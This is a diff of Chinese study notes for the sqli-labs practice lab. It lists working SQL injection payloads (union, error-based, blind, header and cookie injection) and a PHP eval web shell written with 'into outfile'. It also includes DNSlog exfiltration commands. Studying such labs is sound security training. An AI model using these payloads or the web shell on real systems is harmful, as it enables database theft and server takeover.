@@ -1,3 +1,4 @@
+# less-1_basic_char
 ## 基本流程
 
 目标：获取数据库中所有用户名和密码
@@ -10,21 +11,47 @@
 
 4. group by 或者 order by 判断列数
 
-5. 查询回显位 输入一个不存在的 id 使得无效信息不再显示 id=-1' union select 1,2,3--+ 显示 2, 3 说明回显位是 2，3
+5. 查询回显位 输入一个不存在的 id 使得无效信息不再显示： 
 
-6. id=-1' union select 1,2,database() --+ 查看database名称拿到库名 security
+ ```sql
+   id=-1' union select 1,2,3--+
+ ```
 
-7. version() 可以查看版本
+6. 显示 2, 3 说明回显位是 2，3
 
-8. 拿到表名和列名：information_schema数据库中有 columns：列名集合表 和 tables：表名集合表 两个表，通过 union select 1,2,table_name from information_schema.tables where table_schema='security'（甚至直接写 databases()）
+ ```sql
+   id=-1' union select 1,2,database() --+
+ ```
 
-9. 用 group_concat() 来显示所有 table_name：union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'  .  最终拿到表名 users
+7. 查看 database 名称拿到库名 security
 
-10. union select 1,version(),group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' 获取列名 **用数据库名和数据表名两个来定位所需要的列名** 得到 id username password
+8. version() 可以查看版本
 
-11. 回显 username 和 password：
+9. 拿到表名和列名：information_schema：数据库中有 columns：列名集合表 和 tables：表名集合表 两个表，通过
+
+```sql
+union select 1,2,table_name from information_schema.tables where table_schema='security'
+```
+
+10. （'security' 甚至可以直接写 databases() ）
+
+11. 用 group_concat() 来显示所有 table_name：
+
+```sql
+union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'
+```
+
+最终拿到表名 users
 
 12. ```sql
+    union select 1,version(),group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'
+    ```
+
+     获取列名 **用数据库名和数据表名两个来定位所需要的列名** 得到 id username password
+
+13. 回显 username 和 password：
+
+14. ```sql
     union select 1,version(),group_concat(username,'%%%%%',password) from users
     ```
 
@@ -84,25 +111,26 @@ information_schema.columns 结构：
 | DOMAIN_SCHEMA            | nvarchar(128)  | 如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的创建者。否则，返回 NULL。 |
 | DOMAIN_NAME              | nvarchar(128)  | 如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的名称。否则，返回 NULL。 |
 
+# less-2_basic_num
 ## 数字型
 
 其他步骤与 less-1 相同，只不过变成了数字型注入
 
-## 括号闭合（1）
-
+# less-3_basic_bracket
+## 括号闭合
 1. 先判断是字符型
 2. ?id=2' order by 3 --+后报错 check the manual that corresponds to your MySQL server version for the right syntax to use near 'order by 3 -- ') LIMIT 0,1' at line 1 说明要用单引号和括号来闭合
 3. 其他步骤相同
 
-## 括号闭合（2）
-
+# less-4_basic_bracket2
+## 括号闭合
 1. 字符型
 2. ?id=2' order by 3--+ 其中 order by 后面数字不管多大都没反应，说明闭合有问题
 3. 尝试把单引号改成双引号，出现报错：……use near 'order by 3-- ") LIMIT 0,1' at line 1说明应该用双引号加右括号进行闭合
 4. 后续步骤相同
 
-## 报错注入（1）
-
+# less-5_extractvalue
+## 报错注入
 1. ?id=1' order by 100 --+ 报错 Unknown column '100' in 'order clause' 说明已经正确闭合了
 
 2. ?id=-1'  order by 3--+ 什么都不显示
@@ -123,13 +151,13 @@ information_schema.columns 结构：
 
 9. 后面的步骤与前面相同
 
-10. 遇到问题：最多默认返回32个字符，利用 substring 函数解决
+10. 遇到问题：最多默认返回32个字符，利用 substring/substr 函数解决
 
 11. ```sql
-    union select 1,2,extractvalue('yemaster', substring(concat(0x7e, (select group_concat(username,'~',password) from users)),4,30))
+    union select 1,2,extractvalue('nanamo', substring(concat(0x7e, (select group_concat(username,'~',password) from users)),4,30))
     ```
 
-
+substr(string, a, b)
 
 利用 extractvalue() 注入：
 
@@ -162,7 +190,8 @@ substring(123456,4,3)
 
 
 
-## 报错注入（2）
+# less-5_floor
+## 报错注入
 
 相关函数：
 
@@ -217,7 +246,8 @@ select concat(username,"-",password) from users limit 0,1
 
 
 
-## 报错注入（3）
+# less-6_updatexml
+## 报错注入
 
 其实与 less-5 一样，只是用双引号闭合
 
@@ -235,7 +265,7 @@ select concat(username,"-",password) from users limit 0,1
 
 利用 updatexml() 报错注入，原理与 extractvalue() 一致
 
-```
+```sql
 select updatexml('XML_document','Xpath_string','New_content') from xml
 ```
 
@@ -243,7 +273,8 @@ select updatexml('XML_document','Xpath_string','New_content') from xml
 
 同样在 xpath 中第一位改为 ~ 用于报错
 
-# 文件注入
+# less-7_outfile
+## 文件注入
 
 1. ```sql
    SHOW VARIABLES LIKE '%secure%'
@@ -262,7 +293,7 @@ select updatexml('XML_document','Xpath_string','New_content') from xml
 4. 注入木马
 
 5. ```sql
-   select 1,2,'<?php @eval($_POST["abc123"])?>' into outfile "C:\\phpstudy_pro\\WWW\\hackin.php"
+   select 1,2,'<?php @eval($_POST["nanamo"])?>' into outfile "C:\\phpstudy_pro\\WWW\\hackin.php"
    ```
 
 6. Linux 服务器 可能的路径："/var/www/html/test/"
@@ -273,19 +304,20 @@ select updatexml('XML_document','Xpath_string','New_content') from xml
 
 
 
-# 布尔盲注
+# less-8_bool
+## 布尔盲注
 
 适用于页面只有真值、假值两种情况。手工布尔盲注费时费力。
 
 1. 先判断闭合方式/页面的真假性：and 1=1, and 1=2
 
-2. ```
+2. ```sql
    ?id=1' and length((select database())) > 9 --+
    ```
 
 3. 通过调整参数得知 select database() 返回值的长度
 
-4. ```
+4. ```sql
    ?id=1' and ascii((select database())) > 100 --+
    ```
 
@@ -293,13 +325,14 @@ select updatexml('XML_document','Xpath_string','New_content') from xml
 
 6. 利用 substr 选择查看其他位置上的字母（substr() 和 substring() 没有区别，下标从1开始）
 
-7. ```
+7. ```sql
    ?id=1' and ascii(substr((select database()),2,1)) > 100 --+
    ```
 
 8. 依此类推重复之前题目的方法
 
-# DNSlog 渗透
+# less-9_dnslog
+## DNSlog 渗透
 
 DNSLog渗透是一种利用DNS（域名系统）协议进行攻击和信息收集的技术。其原理基于DNS协议的特性，即将域名解析为IP地址。攻击者可以创建一个恶意的DNS服务器，当受害者的计算机尝试解析特定的域名时，DNS服务器会记录请求，并将请求信息发送给攻击者，从而实现信息收集。
 
@@ -329,7 +362,9 @@ load_file() 既可以读取本机文件（看对方有没有放开这个权限�
 
 需要打开文件读写权限
 
-# 使用脚本 DnslogSqlinj
+# less-9_dnslogsqlinj
+
+## 使用脚本 DnslogSqlinj
 
 ```shell
 python2 dnslogSql.py -u "http://192.168.216.134/sqli-labs-php7/Less-9/?id=1' and ({})--+" --dbs
@@ -338,9 +373,12 @@ python2 dnslogSql.py -u "http://192.168.216.134/sqli-labs-php7/Less-9/?id=1' and
 python2 dnslogSql.py -u "http://192.168.216.134/sqli-labs-php7/Less-9/?id=1' and ({})--+" -D security -T users -C username,password --dump
 ```
 
+过时的脚本，多年未维护，应该还是去用 sqlmap 比较好
 
+# less-9_time
 
 ## 时间盲注
+
 啥回显都没有，甚至没有真假值的区别，而网站会执行你写的代码，此时可以使用时间盲注
 
 ```sql
@@ -355,11 +393,12 @@ if(condition, True, False)
 
 条件式为真时执行 True 语句，条件式为假时执行 False 语句，从而达到判断的效果
 
-# post 注入
+# less-11_post
+## post 注入
 
 1. 用 burp suite 抓包查看提交信息
 
-   <img src="C:\Users\A2140\AppData\Roaming\Typora\typora-user-images\image-20240504155324178.png" alt="image-20240504155324178" style="zoom:67%;" />
+   ![](https://s2.loli.net/2024/05/12/4bGMlaSktwWUD1K.png)
 
 2. 看到提交的参数分别是 uname passwd submit
 
@@ -369,11 +408,12 @@ if(condition, True, False)
 
 5. 如果想获取数据库相关信息，在单引号和 # 之间进行 union 注入即可
 
-# 使用 Burp Suite 进行 Header Injection
+# less-18_uagent
+## 使用 Burp Suite 进行 Header Injection
 
 1. 首先我们需要争取到一个 username 和 password
 
-2. 看到页面返回了 User Agent : ![image-20240504191737723](C:\Users\A2140\AppData\Roaming\Typora\typora-user-images\image-20240504191737723.png)
+2. 看到页面返回了 User Agent : ![](https://s2.loli.net/2024/05/12/olfxwdSi6gaFruC.png)
 
 3. 查看 php 源码得知注入点就在 $uagent
 
@@ -393,11 +433,13 @@ if(condition, True, False)
 
 
 
-# 使用 Burp Suite 进行 Header Injection
+# less-19_referer
+## 使用 Burp Suite 进行 Header Injection
 
 跟 less-18 几乎一样，只是注入位置从 user-agent 到了 referer
 
-# 使用 Burp Suite 进行 Header Injection
+# less-20_cookie
+## 使用 Burp Suite 进行 Header Injection
 
 ```php
 $cookee = $_COOKIE['uname'];
